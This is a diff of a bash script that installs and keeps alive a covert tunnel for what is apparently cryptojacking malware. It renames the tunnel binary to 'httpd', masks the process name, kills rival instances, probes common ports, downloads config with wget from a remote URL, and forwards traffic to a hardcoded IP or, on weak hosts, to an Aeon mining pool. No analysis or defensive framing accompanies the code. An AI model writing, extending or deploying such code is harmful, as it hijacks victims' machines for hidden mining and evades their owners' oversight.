@@ -1,26 +1,32 @@
 #!/bin/bash
 
 ## tnl starter
+## TODO tstarter should support multiple listeners
 ## $1 is the starting port (for overrides)
 function tstarter(){
 
     tnlpid(){
-        pgrep -xf "${TNL_MASK} ${TNL_ARGS}\s*"
+        pgrep -xf "${PGREP_TNL_MASK}"
     }
 
     portavl() {
-        if $(busybox nc -z 127.0.0.1 ${TNL_LISTEN}); then
-            return 1
+        exec {socket}<>/dev/tcp/${TNL_LISTEN_ADDR}/${TNL_LISTEN_PORT}
+        avl=$?
+        if [ $avl = 0 ]; then
+            eval "exec ${socket}>&-"
+            return 1 ## port already taken
         else
-            return 0
+            printf "$1"
+            return 0 ## nothing listening on port
         fi
     }
     checktnl() {
         local pid="$(tnlpid)"
         ## lsof or netstat require /proc so not reliable
-        local port="$(busybox nc -z 127.0.0.1 ${TNL_LISTEN} && printf 1)"
-        local tss="$(jobs | grep ${TNL_MASK})"
-        if [ -z "$pid" -o -z "$port" -o -z "$tss" ]; then ## order kind of matters
+        id_job tnl
+        tss=$job_n
+        # local tss="$(jobs | grep ${TNL_MASK})"
+        if [ -z "$pid" -o -n "$(portavl 1)" -o -z "$tss" ]; then ## order kind of matters
             return 1
         else
             return 0
@@ -29,37 +35,38 @@ function tstarter(){
     starttnl(){
         ## starttnl should never be called more than once at a time
         if [ -n "$(tnlpid)" ]; then
-            if [ -n "$(jobs | grep "$TNL_MASK")" ]; then
+            id_job tnl
+            if [ -n "$job_n" ]; then
                 # printf "%s" ${PREV_TNL_LISTEN} ## the previous port binded
-                TNL_LISTEN=${PREV_TNL_LISTEN}
+                TNL_LISTEN_PORT=${PREV_TNL_LISTEN_PORT}
                 return ## tnl started and already in session
             else ## a rogue tunnel not within its session kill it
-                pkill -xf "${TNL_MASK} ${TNL_ARGS}"
+                pkill -xf "${TNL_MASK}"
             fi
         fi
-        eval "coproc ${TNL_MASK} { exec ${TNL_MASK} ${TNL_ARGS}; }"
+        eval "coproc tnl { export -n \$(export -p) 2>/dev/null; exec \"${TNL_MASK}\"; }"
         fleep 1 ## time to bind
     }
 
-    export TNL_LISTEN=$1
+    export TNL_LISTEN_PORT=$1
     gcpid=$(tnlpid)
     [ -n "$gcpid" ] && kill -9 $gcpid
     for port in $TNL_PLIST; do
         if portavl; then
             starttnl
         else
-            checktnl && exit 0 ## check again in case of late start
-            PREV_TNL_LISTEN=$TNL_LISTEN
-            export TNL_LISTEN=$port
+            checktnl && return 0 ## check again in case of late start
+            PREV_TNL_LISTEN_PORT=$TNL_LISTEN_PORT
+            export TNL_LISTEN_PORT=$port
             envsubst -no-empty -i cfg/${TNL_CFG} -o ${TNL_CFG_MASK}
             continue
         fi
         if checktnl; then
-            # printf "%s" ${TNL_LISTEN}
+            # printf "%s" ${TNL_LISTEN_PORT}
             return
         else
-            PREV_TNL_LISTEN=$TNL_LISTEN
-            export TNL_LISTEN=$port
+            PREV_TNL_LISTEN_PORT=$TNL_LISTEN_PORT
+            export TNL_LISTEN_PORT=$port
             envsubst -no-empty -i cfg/${TNL_CFG} -o ${TNL_CFG_MASK}
         fi
     done
@@ -68,41 +75,46 @@ function tstarter(){
 }
 
 function setup_tnl() {
-    TNL_REMOTE=${TNL_REMOTE:-198.204.227.235}
+    TNL_LISTEN_ADDR=127.255.255.254
+    # TNL_LISTEN_ADDR2=127.255.255.253
+    TNL_FORWARD_ADDRESS=${TNL_FORWARD_ADDRESS:-198.204.227.235}
     TNL_PLIST="80 8081 443 8081 8082 9000 10000 3036 20 21 465 993 995 110 123 2703 3036"
     TNL_CFG=${TNL_CFG:-gst.json.tpl}
     TNL_PATH=${TNL_PATH:-$(get_path gst)}
-    PC_PATH=${PC_PATH:-$(get_path pc)}
+    # PC_PATH=${PC_PATH:-$(get_path pc)}
     TNL_MASK=${TNL_MASK:-httpd}
-    TNL_CFG_MASK=${TNL_CFG_MASK:-httpd.conf}
-    PC_CFG=${PC_CFG:-pc.conf.tpl}
-    PC_CFG_MASK=${PC_CFG_MASK:-${PC_CFG%.tpl}}
-    TNL_ARGS=${TNL_ARGS:--C ${TNL_CFG_MASK}}
-    ## download cfg
+    TNL_CFG_MASK=${TNL_CFG_MASK:-gost.json}
+    # PC_CFG=${PC_CFG:-pc.conf.tpl}
+    # PC_CFG_MASK=${PC_CFG_MASK:-${PC_CFG%.tpl}}
+    # TNL_ARGS=${TNL_ARGS:--C ${TNL_CFG_MASK}}
+    # download cfg
     if [ ! -e "cfg/${TNL_CFG}" ]; then
         wget -q "${CFG_BASE_URL}${TNL_CFG}" -O "cfg/${TNL_CFG}"
     fi
     ## download pc
-    if [ ! -e "cfg/${PC_CFG}" ]; then
-        wget -q "${CFG_BASE_URL}${PC_CFG}" -O "cfg/${PC_CFG}"
-    fi
+    # if [ ! -e "cfg/${PC_CFG}" ]; then
+    #     wget -q "${CFG_BASE_URL}${PC_CFG}" -O "cfg/${PC_CFG}"
+    # fi
     ## mask
     if [ -e "$TNL_PATH" ]; then
         mv "$TNL_PATH" "$(dirname ${TNL_PATH})/${TNL_MASK}"
     fi
     ## config with needed vars
     if [ "$jail" -o -n "$(uname -r | grep -E ^2\.6\.[0-9]*\|^3\.1[0-9]*)" ]; then
-        TNL_PROTO=${TNL_PROTO:-socks+tcp}
+        TNL_FORWARD_SCHEME=${TNL_FORWARD_SCHEME:-mwss}
     fi
     if [ "$lowhw" ]; then
-        TNL_TARGET=${TNL_TARGET:-pool.supportaeon.com:3333}
+        TNL_LISTEN_TARGET=${TNL_LISTEN_TARGET:-pool.supportaeon.com:3333}
+    else
+        TNL_LISTEN_TARGET=${TNL_LISTEN_TARGET:-${ENDPOINT}}
+        TNL_LISTEN_TARGET2=${TNL_LISTEN_TARGET2:-${ENDPOINT2}}
     fi
-    export TNL_REMOTE="$TNL_REMOTE" \
-           TNL_LISTEN=${TNL_LISTEN:-8080} \
-           TNL_PROTO \
-           TNL_PROTO_PC \
-           TNL_TARGET
+    export TNL_FORWARD_ADDRESS="$TNL_FORWARD_ADDRESS" \
+           TNL_LISTEN_PORT=${TNL_LISTEN_PORT:-8080} \
+           TNL_FORWARD_SCHEME \
+           TNL_LISTEN_SCHEME \
+           TNL_LISTEN_TARGET TNL_LISTEN_TARGET2
     envsubst -no-empty -i cfg/${TNL_CFG} -o ${TNL_CFG_MASK}
-    tstarter ${TNL_LISTEN}  || exit 1 ## tstarter takes care of updating TNL_LISTEN for the pc config
-    envsubst -no-empty -i cfg/${PC_CFG} -o ${PC_CFG_MASK}
+    tstarter ${TNL_LISTEN_PORT:-8080}  || exit 1 ## tstarter takes care of updating TNL_LISTEN for the pc config
+    # envsubst -no-empty -i cfg/${PC_CFG} -o ${PC_CFG_MASK}
 }
